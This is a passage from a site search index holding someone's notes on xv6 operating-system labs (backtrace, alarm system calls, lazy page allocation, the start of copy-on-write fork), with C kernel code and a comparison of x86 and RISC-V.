perform the copy. Idea is in C, the data type will define how many bytes of memory to read, let's say if the data type is int _, then it will read 4 bytes contiguous memory blocks. And since char _ only has the one byte(lowest), it will be safe to copy those memory blocks byte by byte and later cast those address to the original data type.</p>"},{"location":"Systems/OSlab/#lab4-traps","title":"Lab4: traps","text":""},{"location":"Systems/OSlab/#backtrace-moderate","title":"Backtrace (moderate)","text":"<p>Purpose: To understand a bit of RISC-V asm and understand the calling conventions, it is important to understand how RISC-V manage the stack for this part. </p> <p></p> <p>Code part is super straightforward once understand the structure how RISC-V manage the stack, from the question, Note that the return address lives at a fixed offset (-8) from the frame pointer of a stackframe, and that the saved frame pointer lives at fixed offset (-16) from the frame pointer. And also Xv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address. You can compute the top and bottom address of the stack page by using <code>PGROUNDDOWN(fp)</code> and <code>PGROUNDUP(fp)</code> (see <code>kernel/riscv.h</code>. These number are helpful for <code>backtrace</code> to terminate its loop.</p> <pre><code>//kernel/printf.c\nvoid backtrace(void)\n{\n  printf(\"test\");\n  uint64 fp = r_fp();\n  uint64 bot = PGROUNDDOWN(fp);\n  uint64 top = PGROUNDUP(fp);\n\n  printf(\"backtrace:\\n\");  \n  while((fp &gt; bot) &amp;&amp; (fp &lt; top)){\n          // so to find the address of the ra, we know it is -8 of the frame pointer, so is the fp-8, then cuz it is an address value, need to cast this to a pointer and want to find the exact memory at this address so dereference into that\n    uint64 *ra = (uint64 *) (fp -8);\n    printf(\"%p\\n\",*ra);\n    fp = *(uint64 *) (fp -16);\n  }\n\n}\n//kernel/riscv.h\n//this code is provided to get the s0(fp), frame pointer of the stack\nstatic inline uint64\nr_fp()\n{\n  uint64 x;\n  asm volatile(\"mv %0, s0\" : \"=r\" (x) );\n  return x;\n}\n</code></pre> <p>The only tricky part is to cast the address to a pointer and dereference that pointer address to get the return address in each stack frame. <code>uint64 *ra = (uint64 *) (fp -8);</code></p>"},{"location":"Systems/OSlab/#alarm-hard","title":"Alarm (hard)","text":"<p>Purpose: Add a feature to xv6  that periodically alerts a process as it uses CPU time. This will involve interrupt practice which needs return the saved registers from jump from user space to kernel.</p> <p>Add a function sigalarm(interval, handler) system call.</p> <pre><code>//user.h\nint sigalarm(int ticks, void (*handler)());\nint sigreturn(void);\n\n//proc.h\nint ticks;\nint interval;\nvoid (*handler)();  //define a handler function pointer\nstruct trapframe *alarmtrapframe;\n\n//sysproc.c -&gt; main implementation for sigalarm and return\nuint64\nsys_sigalarm(void)\n{\n  //Your sys_sigalarm() should store the alarm interval and the pointer to the handler function in new fields in the proc structure (in kernel/proc.h).\n  struct proc *p = myproc();\n  int interval;\n  uint64 handler;\n  if(argint(0, &amp;interval) &lt; 0) //get the first tick argument\n    return -1;\n\n  if(argaddr(1, &amp;handler) &lt; 0)  //get the second address argument\n    return -1;\n\n  p-&gt;interval = interval;  \n  p-&gt;handler = (void (*)())handler;\n  p-&gt;ticks = 0;\n  p-&gt;alarmtrapframe = 0;\n  //execute the handler function until the ticks cycle \n  return 0;\n}\n\nuint64\nsys_sigreturn(void)\n{\n  struct proc *p = myproc();\n  if(p-&gt;alarmtrapframe !=0){\n    memmove(p-&gt;trapframe,p-&gt;alarmtrapframe,sizeof(struct trapframe));\n    kfree(p-&gt;alarmtrapframe);\n    p-&gt;alarmtrapframe = 0;  //alarmtrapframe will be used like a semaphore to make sure only one process can make this system call until it returns (Prevent re-entrant calls to the handler----if a handler hasn't returned yet, the kernel shouldn't call it again)\n  }\n  //restore the alarmtrapframe to trapframe\n  return 0;\n}\n\n//usertrap.c\n  // give up the CPU if this is a timer interrupt.\n  if(which_dev == 2){\n    if(p-&gt;interval != 0){\n      p-&gt;ticks ++;\n      if(p-&gt;ticks == p-&gt;interval){\n        p-&gt;ticks = 0;\n        if(p-&gt;alarmtrapframe == 0){ \n          p-&gt;alarmtrapframe = kalloc();\n          //copy the trapframe registers to alarmtrapframe\n          //notes: cannot directly use size of a struct pointer since it is only a memory address\n          //sizeof(struct trapframe) = 288\n          memmove(p-&gt;alarmtrapframe,p-&gt;trapframe,sizeof(struct trapframe));\n          p-&gt;trapframe-&gt;epc =(uint64)p-&gt;handler;\n        }\n\n      }else{\n        yield();\n      }\n    }else{\n      yield();\n    }\n  }\n</code></pre> <p>Reference:</p> <p>https://www.cnblogs.com/weijunji/p/14338466.html</p>"},{"location":"Systems/OSlab/#more","title":"More","text":"<p>x86 and RISC-V difference, based on my experience in both x86 and RISC-v, found there are quite some difference in these two architectures. Some difference are,</p>"},{"location":"Systems/OSlab/#1-instruction-set-complexity","title":"1. Instruction Set Complexity:","text":"<ul> <li>x86: It is a Complex Instruction Set Computing (CISC) architecture, meaning it has a large number of complex instructions, some of which can perform multiple operations in a single instruction. x86 instructions can vary in length, and some instructions are highly specialized.</li> <li>RISC-V: It is a Reduced Instruction Set Computing (RISC) architecture. The instructions are simpler, fixed in size, and designed to execute within one clock cycle. RISC-V has a smaller and more uniform set of instructions, which makes the assembly language easier to learn and the hardware simpler to implement.</li> </ul>"},{"location":"Systems/OSlab/#2-registers","title":"2. Registers:","text":"<ul> <li>x86: It has a smaller number of general-purpose registers (like <code>EAX</code>, <code>EBX</code>, <code>ECX</code>, <code>EDX</code> for 32-bit, and <code>RAX</code>, <code>RBX</code>, etc., for 64-bit), and some registers have specific uses (e.g., <code>RSP</code> for the stack pointer).</li> <li>RISC-V: It has 32 general-purpose registers (<code>x0</code> to <code>x31</code>), with <code>x0</code> always hardwired to zero. The register usage is more flexible compared to x86.</li> </ul>"},{"location":"Systems/OSlab/#3-addressing-modes","title":"3. Addressing Modes:","text":"<ul> <li>x86: Supports a variety of complex addressing modes, such as register indirect with displacement, base-plus-index, and more.</li> <li>RISC-V: Has simpler addressing modes, primarily focused on register-indirect and immediate offsets.</li> </ul>"},{"location":"Systems/OSlab/#4-instruction-format","title":"4. Instruction Format:","text":"<ul> <li>x86: Instructions can be of varying lengths (from 1 to 15 bytes), and the format is quite complex due to the need for backward compatibility.</li> <li>RISC-V: Instructions are uniformly 32 bits in length (in the base ISA), making decoding simpler and faster.</li> </ul>"},{"location":"Systems/OSlab/#5-function-calling-conventions","title":"5. Function Calling Conventions:","text":"<ul> <li>x86: The calling conventions are complex, with arguments passed through registers and the stack, and specific registers reserved for return values (<code>EAX</code>, <code>RAX</code>) and other purposes.</li> <li>RISC-V: Has a simpler calling convention. Function arguments are passed in registers <code>a0</code> to <code>a7</code>, and return values are typically passed in <code>a0</code> (and <code>a1</code> for double-word results).</li> </ul>"},{"location":"Systems/OSlab/#6-branching","title":"6. Branching:","text":"<ul> <li>x86: Has a variety of conditional and unconditional branch instructions, with complex branch prediction mechanisms.</li> <li>RISC-V: Uses a simpler set of branch instructions, with conditions typically being checked via comparison instructions that set flags.</li> </ul>"},{"location":"Systems/OSlab/#7-stack-management","title":"7. Stack Management:","text":"<ul> <li>x86: Uses a dedicated stack pointer (<code>ESP</code>/<code>RSP</code>), with push and pop instructions.</li> <li>RISC-V: Also uses a stack, but it is managed more manually, with load and store instructions. There are no dedicated push/pop instructions; instead, you manually adjust the stack pointer and store/load values.</li> </ul>"},{"location":"Systems/OSlab/#2020-lab-lazy-allocation","title":"2020 Lab: Lazy allocation","text":"<p>The purpose of this lab is to understand the lazy allocation of user-space heap memory, </p> <p>Consider, for example, that a gigabyte consists of 262,144 4096-byte pages; that's a huge number of allocations even if each is individually cheap. In addition, some programs allocate more memory than they actually use (e.g., to implement sparse arrays), or allocate memory well in advance of use. </p> <p>To allow sbrk() to complete more quickly in these cases, sophisticated kernels allocate user memory lazily. That is, sbrk() doesn't allocate physical memory, but just remembers which user addresses are allocated and marks those addresses as invalid in the user page table. When the process first tries to use any given page of lazily-allocated memory, the CPU generates a page fault, which the kernel handles by allocating physical memory, zeroing it, and mapping it. You'll add this lazy allocation feature to xv6 in this lab.</p>"},{"location":"Systems/OSlab/#eliminate-allocation-from-sbrk-easy","title":"Eliminate allocation from sbrk() (easy)","text":"<pre><code>uint64\nsys_sbrk(void)\n{\n  int addr;\n  int n;\n\n  if(argint(0, &amp;n) &lt; 0)\n    return -1;\n  addr = myproc()-&gt;sz;\n  myproc()-&gt;sz = myproc()-&gt;sz + n;\n  // if(growproc(n) &lt; 0)\n  //   return -1;\n  return addr;\n}\n</code></pre> <p>Instead of directly allocating the size on sbrk, increase the size only but without allocating the memory first.</p>"},{"location":"Systems/OSlab/#lazy-allocation-moderate","title":"Lazy allocation (moderate)","text":"<p>Add the page fault handler to realize the lazy allocation, only allocate the required memory when there is a page fault which will cause the trap.</p> <pre><code>void\nusertrap(void)\n{\n  ...\n  } else if((which_dev = devintr()) != 0){\n    // ok\n  } else if (r_scause() == 13 || r_scause() == 15) {\n    // 13: page load fault; 15: page write fault\n    // printf(\"page fault\\n\");\n    uint64 addr = r_stval();\n    if (lazy_alloc(addr) &lt; 0) {\n      p-&gt;killed = 1;\n    }\n  } else {\n    printf(\"usertrap(): unexpected scause %p pid=%d\\n\", r_scause(), p-&gt;pid);\n    printf(\"            sepc=%p stval=%p\\n\", r_sepc(), r_stval());\n    p-&gt;killed = 1;\n  }\n  ...\n}\n\nint\nlazy_alloc(uint64 addr) {\n  struct proc *p = myproc();\n  // page-faults on a virtual memory address higher than any allocated with sbrk()\n  // this should be &gt;= not &gt; !!!\n  if (addr &gt;= p-&gt;sz) {\n    // printf(\"lazy_alloc: access invalid address\");\n    return -1;\n  }\n\n  if (addr &lt; p-&gt;trapframe-&gt;sp) {\n    // printf(\"lazy_alloc: access address below stack\");\n    return -2;\n  }\n\n  uint64 pa = PGROUNDDOWN(addr);\n  char* mem = kalloc();\n  if (mem == 0) {\n    // printf(\"lazy_alloc: kalloc failed\");\n    return -3;\n  }\n\n  memset(mem, 0, PGSIZE);\n  if(mappages(p-&gt;pagetable, pa, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != 0){\n    kfree(mem);\n    return -4;\n  }\n  return 0;\n}\n</code></pre>"},{"location":"Systems/OSlab/#lazytests-and-usertests-moderate","title":"Lazytests and Usertests (moderate)","text":"<p>To enhance the lazy allocation from part2.</p> <ul> <li>Handle negative sbrk() arguments.</li> <li>Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk().</li> <li>Handle the parent-to-child memory copy in fork() correctly.</li> <li>Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated.</li> <li>Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process.</li> <li>Handle faults on the invalid page below the user stack.</li> </ul> <pre><code>uint64\nwalkaddr(pagetable_t pagetable, uint64 va)\n{\n  pte_t *pte;\n  uint64 pa;\n\n  if(va &gt;= MAXVA)\n    return 0;\n\n  pte = walk(pagetable, va, 0);\n  if(pte == 0 || (*pte &amp; PTE_V) == 0) {\n    if (lazy_alloc(va) == 0) {\n      pte = walk(pagetable, va, 0);\n    } else {\n      return 0;\n    }\n  }\n  if((*pte &amp; PTE_U) == 0)\n    return 0;\n  pa = PTE2PA(*pte);\n  return pa;\n}\n</code></pre>"},{"location":"Systems/OSlab/#lab5-copy-on-write-fork-for-xv6","title":"Lab5: Copy-on-Write Fork for xv6","text":"<p>The problem:</p> <p>The fork() system call in xv6 copies all of the parent process's user-space memory into the child. If the parent is large, copying can take a long time. Worse, the work is often largely wasted; for example, a fork() followed by exec() in the child will cause the child to discard the copied memory, probably without ever using most of it. On the other hand, if both parent and child use a page, and one or both writes it, a copy is truly needed.</p>"},{"location":"Systems/OSlab/#implement-copy-on-writehard","title":"Implement copy-on write(hard)****","text":""}]}